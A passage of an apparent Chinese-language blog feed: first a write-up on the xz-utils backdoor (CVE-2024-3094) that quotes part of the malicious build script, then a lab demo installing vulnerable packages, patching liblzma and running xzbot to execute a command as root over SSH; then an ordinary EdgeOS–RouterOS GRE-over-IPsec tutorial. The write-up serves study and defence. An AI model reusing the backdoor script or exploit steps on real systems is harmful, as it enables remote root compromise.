\</span><br><span class="hljs-string">sed &quot;1i # 0 \&quot;$top_srcdir/src/liblzma/check/crc32_fast.c\&quot;&quot; 2&gt;/dev/null | \</span><br><span class="hljs-string">$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then</span><br><span class="hljs-string">eval $RgYB</span><br><span class="hljs-string">if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then</span><br><span class="hljs-string">if test ! -f .libs/liblzma.so; then</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true</span><br><span class="hljs-string">fi</span><br><span class="hljs-string">rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true</span><br><span class="hljs-string">else</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true</span><br><span class="hljs-string">fi</span><br><span class="hljs-string">rm -f .libs/liblzma_la-crc32-fast.o || true</span><br><span class="hljs-string">rm -f .libs/liblzma_la-crc64-fast.o || true</span><br><span class="hljs-string">else</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true</span><br><span class="hljs-string">fi</span><br><span class="hljs-string">else</span><br><span class="hljs-string">mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true</span><br><span class="hljs-string">fi</span><br><span class="hljs-string">rm -f liblzma_la-crc64-fast.o || true</span><br><span class="hljs-string">fi</span><br><span class="hljs-string">eval $DHLd</span><br></code></pre></td></tr></table></figure><blockquote><p>[ ! $(uname)=“Linux” ] &amp;&amp; exit 0 其實沒有空格會導致這行無作用</p></blockquote>        </div>      </div>    </div><p>phase2 payload將會檢查許多條件，如果符合，就會開始後門的植入</p><p>這會繼續從<code>tests/files/good-large_compressed.lzma</code>中解壓縮出<code>liblzma_la-crc64-fast.o</code>和<code>liblzma_la-crc32-fast.o</code>，這是個惡意的連接檔</p><p>並將原本的檔案做備份到名稱接近的檔案</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o<br></code></pre></td></tr></table></figure><p>接著就是修改編譯的檔案，植入後門</p><p>最後根據成功或失敗，把解壓縮的檔案清除，或將備份的檔案復原</p><p>如果想瞭解更詳細的植入過程，可以參考此網站<a href="https://research.swtch.com/xz-script">research!rsc: The xz attack shell script</a><sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><span class="hint--top hint--rounded" aria-label="[research!rsc: The xz attack shell script](https://research.swtch.com/xz-script)">[6]</span></a></sup></p><p>或是參考這張圖理解，此圖來自<a href="https://twitter.com/fr0gger_/status/1774342248437813525">Thomas Roccia</a></p><p><img src="xz-infographic.jpeg" alt=""></p><p>有關對liblzma_la-crc32-fast.o、liblzma_la-crc64-fast.o的逆向分析，可以參考以下連結</p><p><a href="https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504">[WIP] XZ Backdoor Analysis and symbol mapping</a></p><p><a href="https://github.com/smx-smx/xzre">smx-smx/xzre: XZ backdoor reverse engineering</a></p><p><a href="https://www.wevul.com/8192.html">XZ-Utils供应链威胁揭秘：后门投毒深度分析与防御策略 - 网络攻防</a></p><p>超級懶人包：簡單來說就是透過liblzma_la-crc32-fast.o、liblzma_la-crc64-fast.o這兩個連接檔，在編譯時修改了原本<code>_get_cpuid()</code>函數，在執行時透過gcc ifunc劫持openssl的<code>RSA_public_decrypt()</code>函數，達成後門</p><h2 id="xz與sshd-rce的關係">xz與sshd/rce的關係</h2><p>理論上openssh並不依賴liblzma，但是debian等發行版修改了openssh，為openssh打上了patch，讓其支援systemd的通知，因此依賴了libsystemd，而libsystemd依賴liblzma，因此openssh間接依賴liblzma，這導致後門的產生。</p><h1 id="演示">演示</h1><p>以下參考<a href="https://github.com/amlweems/xzbot">amlweems/xzbot</a><sup id="fnref:7" class="footnote-ref"><a href="#fn:7" rel="footnote"><span class="hint--top hint--rounded" aria-label="[amlweems/xzbot](https://github.com/amlweems/xzbot)">[7]</span></a></sup></p><h3 id="honeypot">honeypot</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/openssh/openssh-portable</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">patch -p1 &lt; ~/path/to/openssh.patch</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">autoreconf</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">./configure</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><h3 id="下載並安裝有漏洞的xz-utils和liblzma">下載並安裝有漏洞的xz-utils和liblzma</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/xz-utils_5.6.1-1_amd64.deb</span><br>--2024-04-30 16:53:29--  https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/xz-utils_5.6.1-1_amd64.deb<br>Resolving snapshot.debian.org (snapshot.debian.org)... 185.17.185.185, 193.62.202.27, 2001:630:206:4000:1a1a:0:c13e:ca1b, ...<br>Connecting to snapshot.debian.org (snapshot.debian.org)|185.17.185.185|:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 491980 (480K)<br>Saving to: ‘xz-utils_5.6.1-1_amd64.deb.1’<br><br>xz-utils_5.6.1-1_amd64.deb.1 100%[=============================================&gt;] 480.45K   322KB/s    in 1.5s<br><br>2024-04-30 16:53:32 (322 KB/s) - ‘xz-utils_5.6.1-1_amd64.deb.1’ saved [491980/491980]<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/liblzma5_5.6.1-1_amd64.deb</span><br>--2024-04-30 16:53:54--  https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/liblzma5_5.6.1-1_amd64.deb<br>Resolving snapshot.debian.org (snapshot.debian.org)... 185.17.185.185, 193.62.202.27, 2001:1af8:4020:b030:deb::185, ...<br>Connecting to snapshot.debian.org (snapshot.debian.org)|185.17.185.185|:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 252188 (246K)<br>Saving to: ‘liblzma5_5.6.1-1_amd64.deb.1’<br><br>liblzma5_5.6.1-1_amd64.deb.1 100%[=============================================&gt;] 246.28K   212KB/s    in 1.2s<br><br>2024-04-30 16:53:56 (212 KB/s) - ‘liblzma5_5.6.1-1_amd64.deb.1’ saved [252188/252188]<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">dpkg -i xz-utils_5.6.1-1_amd64.deb liblzma5_5.6.1-1_amd64.deb</span><br>(Reading database ... 55615 files and directories currently installed.)<br>Preparing to unpack xz-utils_5.6.1-1_amd64.deb ...<br>Unpacking xz-utils (5.6.1-1) over (5.6.1-1) ...<br>Preparing to unpack liblzma5_5.6.1-1_amd64.deb ...<br>Unpacking liblzma5:amd64 (5.6.1-1) over (5.6.1-1) ...<br>Setting up liblzma5:amd64 (5.6.1-1) ...<br>Setting up xz-utils (5.6.1-1) ...<br>Processing triggers for man-db (2.11.2-2) ...<br>Processing triggers for libc-bin (2.36-9+deb12u6) ...<br></code></pre></td></tr></table></figure><h3 id="patch-liblzma-so">patch liblzma.so</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip install pwntools</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">shasum -a 256 liblzma.so.5.6.1</span><br>605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4  liblzma.so.5.6.1<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 patch.py /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1</span><br>Patching func at offset: 0x24470<br>Generated patched so: liblzma.so.5.6.1.patch<br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1 /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1.ori</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1.patch /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1</span><br></code></pre></td></tr></table></figure><h3 id="backdoor-demo">backdoor demo</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go install github.com/amlweems/xzbot@latest</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xzbot -h</span><br>Usage of xzbot:<br>  -addr string<br>        ssh server address (default &quot;127.0.0.1:2222&quot;)<br>  -seed string<br>        ed448 seed, must match xz backdoor key (default &quot;0&quot;)<br>  -cmd string<br>        command to run via system() (default &quot;id &gt; /tmp/.xz&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xzbot -addr 127.0.0.1:22 -cmd <span class="hljs-string">&#x27;id &gt; /tmp/.xz&#x27;</span></span><br>00000000  00 00 00 1c 73 73 68 2d  72 73 61 2d 63 65 72 74  |....ssh-rsa-cert|<br>00000010  2d 76 30 31 40 6f 70 65  6e 73 73 68 2e 63 6f 6d  |-v01@openssh.com|<br>00000020  00 00 00 00 00 00 00 03  01 00 01 00 00 01 01 01  |................|<br>00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>000000b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>000000d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>000000e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>000000f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000100  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000120  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000130  00 00 00 00 00 00 00 00  00 00 00 01 00 00 00 00  |................|<br>00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000160  00 00 01 14 00 00 00 07  73 73 68 2d 72 73 61 00  |........ssh-rsa.|<br>00000170  00 00 01 01 00 00 01 00  34 12 00 00 78 56 00 00  |........4...xV..|<br>00000180  a2 ff d9 f9 ff ff ff ff  ee 07 97 d2 f3 7b 74 d0  |.............&#123;t.|<br>00000190  77 0e ac cd 7d 9f 9d 20  66 18 6f b4 63 92 1e 08  |w...&#125;.. f.o.c...|<br>000001a0  01 99 59 55 5c e2 1c 2c  48 6e aa 90 f6 4c 38 4c  |..YU\..,Hn...L8L|<br>000001b0  df 97 38 87 d3 b9 f9 e5  c0 c9 6e ed 79 a2 b0 e1  |..8.......n.y...|<br>000001c0  38 81 22 08 17 b1 46 ba  4f 2a 34 98 a2 04 53 7f  |8.&quot;...F.O*4...S.|<br>000001d0  87 3b f2 02 ba e9 e9 16  bd 12 34 4d 3a 1b ae dc  |.;........4M:...|<br>000001e0  31 d8 03 13 05 a8 a6 b6  10 bd 5d c0 80 27 fd e7  |1.........]..&#x27;..|<br>000001f0  9a 7a d2 53 cb 4d 1b d7  9f 1d bf 47 b9 5f a0 49  |.z.S.M.....G._.I|<br>00000200  8c 28 de ce 0a ff 6f 47  0c d2 34 a9 35 00 00 00  |.(....oG..4.5...|<br>00000210  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000220  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000230  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000240  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000250  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000260  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|<br>00000270  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 07  |................|<br>00000280  73 73 68 2d 72 73 61 00  00 00 01 00              |ssh-rsa.....|<br>2024/04/30 16:57:38 ssh: handshake failed: EOF<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /tmp/.xz</span><br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">oss-security - backdoor in upstream xz/liblzma leading to ssh server compromise</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27#design">FAQ on the xz-utils backdoor (CVE-2024-3094)</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://man7.org/linux/man-pages/man7/landlock.7.html">landlock(7) - Linux manual page</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://cmake.org/cmake/help/latest/module/CheckCSourceCompiles.html">CheckCSourceCompiles — CMake 3.29.2 Documentation</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://cmake.org/cmake/help/latest/module/CheckIncludeFile.html">CheckIncludeFile — CMake 3.29.2 Documentation</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a href="https://research.swtch.com/xz-script">research!rsc: The xz attack shell script</a><a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:7" class="footnote-text"><span><a href="https://github.com/amlweems/xzbot">amlweems/xzbot</a><a href="#fnref:7" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:8" class="footnote-text"><span><a href="https://tukaani.org/xz-backdoor/">XZ Utils backdoor</a><a href="#fnref:8" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:9" class="footnote-text"><span><a href="https://gist.github.com/martenson/398bdb7a928069cf67606c9ba919a7ce">xz-utils backdoor situation</a><a href="#fnref:9" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:10" class="footnote-text"><span><a href="https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27">xz-utils backdoor situation (CVE-2024-3094)</a><a href="#fnref:10" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
      
      
      <categories>
          
          <category> 資安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xz </tag>
            
            <tag> CVE-2024-3094 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在EdgeOS和RouterOS之間建立GRE over IPsec tunnel</title>
      <link href="/gre-over-ipsec-between-edgeos-and-routeros/"/>
      <url>/gre-over-ipsec-between-edgeos-and-routeros/</url>
      
        <content type="html"><![CDATA[<h1 id="介紹">介紹</h1><p>一般來說建立GRE over IPsec tunnel有三種方法<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[ GRE Over IPsec for Secure Tunneling : VyOS Support Portal ](https://support.vyos.io/support/solutions/articles/103000096326-gre-over-ipsec-for-secure-tunneling)">[1]</span></a></sup></p><ul><li>GRE over IPsec transport mode</li><li>GRE over IPsec tunnel mode</li><li>Virtual Tunnel Interface (VTI)</li></ul><p>不過RouterOS好像到現在都還不支持VTI，因此本文中不會討論</p><p><img src="ipsec_enc.jpg" alt=""></p><h2 id="GRE-over-IPsec-transport-mode">GRE over IPsec transport mode</h2><p>GRE over IPsec transport mode簡單來說就是建立一個GRE tunnel，並設定IPsec transport mode保護在兩個peer中傳輸的封包內容，ESP只會保護Data段的內容，因此IP Header之類的資訊還是可以被得知</p><p>這種方式缺點是萬一兩邊的IPsec並沒有成功建立、或是連線中斷，由於GRE tunnel是直接使用對方的public IP連線，有可能GRE tunnel會直接在public internet中裸奔，且兩邊都必須有public IP，不能位於NAT後方。</p><h2 id="GRE-over-IPsec-tunnel-mode">GRE over IPsec tunnel mode</h2><p>GRE over IPsec tunnel mode則是先在兩個peer間建立IPsec tunnel，接著使用IPsec tunnel中的IP去建立GRE tunnel，此時GRE tunnel的整個封包都會被ESP給包住，因此達到加密的效果。</p><p>在IPsec連線未成功建立或中斷時，GRE tunnel將無法通訊，這既是缺點也是優點，可以防止通訊裸露在public internet中，但是由於過了兩個tunnel，因此mtu會較低，可能會對速度造成影響</p><h1 id="操作">操作</h1><p>網路拓樸如下，請自行替換對應的IP</p><table><thead><tr><th style="text-align:center"></th><th style="text-align:center"><strong>public IP(WAN IP)</strong></th><th style="text-align:center"><strong>tunnel interface IP</strong></th><th style="text-align:center"><strong>內部網路</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>RouterOS</strong></td><td style="text-align:center">203.0.113.1</td><td style="text-align:center">10.2.1.1/30</td><td style="text-align:center">192.168.1.254/24</td></tr><tr><td style="text-align:center"><strong>EdgeOS</strong></td><td style="text-align:center">203.0.113.2</td><td style="text-align:center">10.2.1.2/30</td><td style="text-align:center">192.168.2.254/24</td></tr></tbody></table><p><img src="network_topology.png" alt=""></p><h2 id="GRE-over-IPsec-transport-mode-2">GRE over IPsec transport mode</h2><p>待更新</p><p>也許可以先參考DN42發布的這篇文章<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[howto/EdgeOS GRE IPsec Example](https://dn42.eu/howto/EdgeOS-GRE-IPsec-Example)">[2]</span></a></sup>研究看看，Ubiquiti Help Center中並沒有IPsec transport mode的相關文件</p><h2 id="GRE-over-IPsec-tunnel-mode-2">GRE over IPsec tunnel mode</h2><p>在這部份中，將會在兩個peer上建立loopback interface，IPsec tunnel將設定成只會轉發對方loopback interface 的IP</p><p>下表是示範時使用的IP，如果要使用其他IP，請替換對應的位置</p><table><thead><tr><th style="text-align:center"></th><th style="text-align:center"><strong>loopback interface IP</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>RouterOS</strong></td><td style="text-align:center">10.1.1.1/32</td></tr><tr><td style="text-align:center"><strong>EdgeOS</strong></td><td style="text-align:center">10.1.1.2/32</td></tr></tbody></table><h3 id="IPsec-tunnel">IPsec tunnel</h3><p>此部份大部分參考這些文件<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="[How to create an IPsec VPN between Unifi USG and Mikrotik firewalls](https://github.com/iisti/how-to-usg-mikrotik-ipsec-vpn)">[3]</span></a></sup><sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="[EdgeRouter to MikroTik IPSec VPN](https://docs.google.com/document/d/13WTT3wZgejNWP0EPNeKQ24XXCVFM3g521doVrzeHqtg/edit)">[4]</span></a></sup>，但在此之上做了一些小修改</p><h4 id="RouterOS">RouterOS</h4><h5 id="IP-IPsec-Profiles-new">IP -&gt; IPsec -&gt; Profiles -&gt; new</h5><p>Profile 是IKE phase1協商的參數</p><p><img src="routeros/ipsec_new_profile.png" alt=""></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-832d777c" role="button" aria-expanded="false" aria-controls="collapse-832d777c">        <div class="fold-arrow">▶</div>更改EdgeOS端Encryption的參數      </div>      <div class="fold-collapse collapse" id="collapse-832d777c">        <div class="fold-content">          <p>如果想更改EdgeOS端Encryption的參數，要在這裡修改對應的參數</p><p><img src="routeros/ipsec_profile_encryption_change.png" alt=""></p>        </div>      </div>    </div><h5 id="IP-IPsec-Peers-new">IP -&gt; IPsec -&gt; Peers -&gt; new</h5><p><img src="routeros/ipsec_new_peer.png" alt=""></p><h5 id="IP-IPsec-Identities-new">IP -&gt; IPsec -&gt; Identities -&gt; new</h5><p><img src="routeros/ipsec_new_indentities.png" alt=""></p><p>先不用在意底下的警告，等最後再回來確認就好</p><h5 id="IP-IPsec-Proposals-new">IP -&gt; IPsec -&gt; Proposals -&gt; new</h5><p><img src="routeros/ipsec_new_proposal.png" alt=""></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-ba6eecfc" role="button" aria-expanded="false" aria-controls="collapse-ba6eecfc">        <div class="fold-arrow">▶</div>更改EdgeOS端DH Group的參數      </div>      <div class="fold-collapse collapse" id="collapse-ba6eecfc">        <div class="fold-content">          <p>如果想更改EdgeOS端DH Group的參數，要在這裡修改對應的參數</p><p><img src="routeros/ipsec_proposal_dhgroup_change.png" alt=""></p>        </div>      </div>    </div><h5 id="建立loopback-interface">建立loopback interface</h5><p>由於RouterOS沒有loopback interface一類的設備<sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Dummy or Loopback interface](https://forum.mikrotik.com/viewtopic.php?t=108227)">[5]</span></a></sup><sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><span class="hint--top hint--rounded" aria-label="[loopback interface in mikrotik](https://forum.mikrotik.com/viewtopic.php?t=187390)">[6]</span></a></sup>，因此創建loopback interface的方法會是建立一個空的bridge，然後給予這個bridge一個IP</p><h6 id="Bridge-Bridge-new">Bridge -&gt; Bridge -&gt; new</h6><p><img src="routeros/new_bridge_general.png" alt=""></p><p><img src="routeros/new_bridge_stp.png" alt=""></p><p>其他設定保持默認就好</p><h6 id="IP-Addresses-new">IP -&gt; Addresses -&gt; new</h6><p><img src="routeros/loopback_interface_ip.png" alt=""></p><h5 id="IP-IPsec-Policies-new">IP -&gt; IPsec -&gt; Policies -&gt; new</h5><p><img src="routeros/ipsec_new_polices_general.png" alt=""></p><p><img src="routeros/ipsec_new_polices_action.png" alt=""></p><p>如果要轉發多個子網的話Action部分的Level要設定為unique，不過此次設定只需要轉發兩端router的IP就好</p><h5 id="IP-Firewall-NAT-new">IP -&gt; Firewall -&gt; NAT -&gt; new</h5><p><img src="routeros/firewall_nat_rule_general.png" alt=""></p><p><img src="routeros/firewall_nat_rule_action.png" alt=""></p><p>要將此條規則移至最上方</p><h4 id="EdgeOS">EdgeOS</h4><h5 id="創建loopback-interface">創建loopback interface</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">set interfaces loopback lo address 10.1.1.2/32<br></code></pre></td></tr></table></figure><h5 id="設定IPsec-Site-to-Site-VPN">設定IPsec Site to Site VPN</h5><p>VPN頁面 -&gt; IPsec Site-to-Site</p><p><img src="edgeos_ipsec_vpn.png" alt=""></p><p>完成這些設定後，兩端的IPsec tunnel應該就架好了，可以嘗試互相ping看看對方的loopback inerface IP，使用RouterOS ping時記得要指定來源IP為loopback inerface IP</p><p>在IPsec 的Active Peers和Installed SAs應該就能看到東西出現了</p><h3 id="GRE-tunnel">GRE tunnel</h3><h4 id="RouterOS-2">RouterOS</h4><h5 id="Interfaces-GRE-Tunnel-new">Interfaces -&gt; GRE Tunnel -&gt; new</h5><p><img src="routeros/gre_new_interface.png" alt=""></p><p>設定成功後應該會顯示mtu的資訊</p><p><img src="routeros/gre_interface_status.png" alt=""></p><h5 id="IP-Addresses-new-2">IP -&gt; Addresses -&gt; new</h5><p><img src="routeros/gre_interface_ip.png" alt=""></p><h5 id="IP-Routes-new">IP -&gt; Routes -&gt; new</h5><p><img src="routeros/gre_new_routes.png" alt=""></p><h4 id="EdgeOS-sup-id-fnref-7-class-footnote-ref-a-href-fn-7-rel-footnote-span-class-hint-top-hint-rounded-aria-label-EdgeRouter-GRE-Tunnel-https-help-ui-com-hc-en-us-articles-205231690-EdgeRouter-GRE-Tunnel-7-span-a-sup">EdgeOS<sup id="fnref:7" class="footnote-ref"><a href="#fn:7" rel="footnote"><span class="hint--top hint--rounded" aria-label="[EdgeRouter - GRE Tunnel ](https://help.ui.com/hc/en-us/articles/205231690-EdgeRouter-GRE-Tunnel)">[7]</span></a></sup></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">configure<br>set interfaces tunnel tun0 local-ip 10.1.1.2<br>set interfaces tunnel tun0 remote-ip 10.1.1.1<br>set interfaces tunnel tun0 encapsulation<br>set interfaces tunnel tun0 encapsulation gre<br>set interfaces tunnel tun0 address 10.2.1.2/30<br>set protocols static interface-route 192.168.1.0/24 next-hop-interface tun0<br>commit ; save<br></code></pre></td></tr></table></figure><p>完成這些設定後，在兩個peer間就建立了GRE over IPsec tunnel</p><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://support.vyos.io/support/solutions/articles/103000096326-gre-over-ipsec-for-secure-tunneling"> GRE Over IPsec for Secure Tunneling : VyOS Support Portal </a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a 